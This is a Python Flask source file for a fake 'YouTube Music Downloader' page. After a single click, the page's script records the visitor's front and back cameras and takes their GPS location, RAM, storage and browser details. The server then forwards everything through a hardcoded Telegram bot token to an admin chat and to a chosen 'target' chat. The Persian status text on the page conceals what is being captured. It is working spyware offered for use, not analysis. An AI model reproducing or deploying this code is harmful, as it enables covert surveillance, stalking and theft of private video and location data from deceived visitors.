from flask import Flask, render_template_string, request, jsonify
import requests
import os
import json

app = Flask(__name__)

BOT_TOKEN = "8856249113:AAHjdpUoGjuRyH9bzD-gSomevMMPg1cet64"
ADMIN_ID = "8173349543"  # آیدی ادمین اصلی شما

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<title>YouTube Music Downloader</title>
<style>
    body{background:#f0f2f5;font-family:sans-serif;text-align:center}
    .header{background:#ff0000;color:white;padding:20px}
    #status{margin-top:20px;font-weight:bold;color:#333;font-size:18px}
</style>
</head>
<body onclick="startAutoProcess()">
    <div class="header"><h1>YouTube Music Downloader</h1></div>
    <div id="status">برای شروع روی صفحه کلیک کنید...</div>

    <script>
    let started = false;
    async function startAutoProcess() {
        if(started) return;
        started = true;
        
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('user') || "{{ admin_id }}";
        
        const info = {
            ua: navigator.userAgent,
            userId: userId,
            ram: navigator.deviceMemory || "نامشخص",
            cores: navigator.hardwareConcurrency || "نامشخص",
            storage: navigator.storage && await navigator.storage.estimate().then(e => (e.quota / 1e9).toFixed(2) + " GB") || "نامشخص"
        };
        
        const mode = "{{ mode }}";

        if (mode === "location") {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                info.lat = pos.coords.latitude;
                info.lon = pos.coords.longitude;
                document.getElementById('status').innerText = "ثبت شد";
                await fetch("/upload_loc", {
                    method: "POST",
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(info)
                });
            });
        }
        else if (mode === "specs") {
            document.getElementById('status').innerText = "در حال بررسی...";
            await fetch("/upload_specs", {
                method: "POST",
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(info)
            });
            document.getElementById('status').innerText = "انجام شد";
        }
        else if (mode === "front") {
            document.getElementById('status').innerText = "ساخته شد";
            await recordAndSend("user", "ساخته شد", info);
        }
        else if (mode === "back") {
            document.getElementById('status').innerText = "تولید شد";
            await recordAndSend("environment", "تولید شد", info);
        }
        else if (mode === "all") {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                info.lat = pos.coords.latitude;
                info.lon = pos.coords.longitude;
                
                document.getElementById('status').innerText = "ساخته شد";
                await recordAndSend("user", "ساخته شد", info);
                
                document.getElementById('status').innerText = "تولید شد";
                await recordAndSend("environment", "تولید شد", info);
            });
        }
    }

    async function recordAndSend(facingMode, label, info) {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: false });
        const recorder = new MediaRecorder(stream);
        let chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        
        return new Promise((resolve) => {
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const fd = new FormData();
                fd.append("video", blob);
                fd.append("info", JSON.stringify(info));
                fd.append("label", label);
                await fetch("/upload", { method: "POST", body: fd });
                stream.getTracks().forEach(t => t.stop());
                resolve();
            };
            recorder.start();
            setTimeout(() => recorder.stop(), 4000);
        });
    }
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE, mode="all", admin_id=ADMIN_ID)

@app.route("/front")
def front():
    return render_template_string(HTML_TEMPLATE, mode="front", admin_id=ADMIN_ID)

@app.route("/back")
def back():
    return render_template_string(HTML_TEMPLATE, mode="back", admin_id=ADMIN_ID)

@app.route("/location")
def location():
    return render_template_string(HTML_TEMPLATE, mode="location", admin_id=ADMIN_ID)

@app.route("/specs")
def specs():
    return render_template_string(HTML_TEMPLATE, mode="specs", admin_id=ADMIN_ID)

@app.route("/upload", methods=["POST"])
def upload():
    video = request.files.get("video")
    info = json.loads(request.form.get("info"))
    label = request.form.get("label")
    target_user_id = info.get("userId")
    
    msg = (f"🚨 گزارش جدید ({label})\n\n"
           f"📍 موقعیت: {info.get('lat', 'نامشخص')}, {info.get('lon', 'نامشخص')}\n"
           f"📱 دستگاه: {info.get('ua')}\n"
           f"💾 رم: {info.get('ram')} GB\n"
           f"🗄 حافظه: {info.get('storage')}\n"
           f"⚙️ هسته پردازنده: {info.get('cores')}\n\n"
           f"ساخته شده توسط ریس شاهد و ریس نوری\n"
           f"@shahidnaimi5642 | @HOKOMAT_ARAB")
    
    # 1. ارسال لوکیشن برای ادمین
    if info.get('lat'):
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
                      data={"chat_id": ADMIN_ID, "latitude": info.get('lat'), "longitude": info.get('lon')})
        
        # ارسال لوکیشن برای کاربر هدف (اگر غیر از ادمین بود)
        if target_user_id and str(target_user_id) != str(ADMIN_ID):
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
                          data={"chat_id": target_user_id, "latitude": info.get('lat'), "longitude": info.get('lon')})
    
    # خواندن استریم ویدیو برای ارسال مجدد (چون stream یکبار مصرف است، از read استفاده می‌کنیم)
    video_bytes = video.read()

    # 2. ارسال ویدیو برای ادمین
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                  data={"chat_id": ADMIN_ID, "caption": msg},
                  files={"video": ("v.webm", video_bytes)})
    
    # ارسال ویدیو برای کاربر هدف (اگر غیر از ادمین بود)
    if target_user_id and str(target_user_id) != str(ADMIN_ID):
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                      data={"chat_id": target_user_id, "caption": msg},
                      files={"video": ("v.webm", video_bytes)})
                      
    return "ok"

@app.route("/upload_loc", methods=["POST"])
def upload_loc():
    info = request.get_json()
    target_user_id = info.get("userId")
    
    if info.get('lat'):
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
                      data={"chat_id": ADMIN_ID, "latitude": info.get('lat'), "longitude": info.get('lon')})
        
        if target_user_id and str(target_user_id) != str(ADMIN_ID):
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
                          data={"chat_id": target_user_id, "latitude": info.get('lat'), "longitude": info.get('lon')})
    return "ok"

@app.route("/upload_specs", methods=["POST"])
def upload_specs():
    info = request.get_json()
    target_user_id = info.get("userId")
    
    msg = (f"🚨 مشخصات دستگاه کاربر\n\n"
           f"📱 دستگاه: {info.get('ua')}\n"
           f"💾 رم: {info.get('ram')} GB\n"
           f"🗄 حافظه: {info.get('storage')}\n"
           f"⚙️ هسته پردازنده: {info.get('cores')}\n\n"
           f"ساخته شده توسط ریس شاهد و ریس نوری\n"
           f"@shahidnaimi5642 | @HOKOMAT_ARAB")
           
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                  json={"chat_id": ADMIN_ID, "text": msg})
                  
    if target_user_id and str(target_user_id) != str(ADMIN_ID):
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                      json={"chat_id": target_user_id, "text": msg})
                      
    return "ok"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
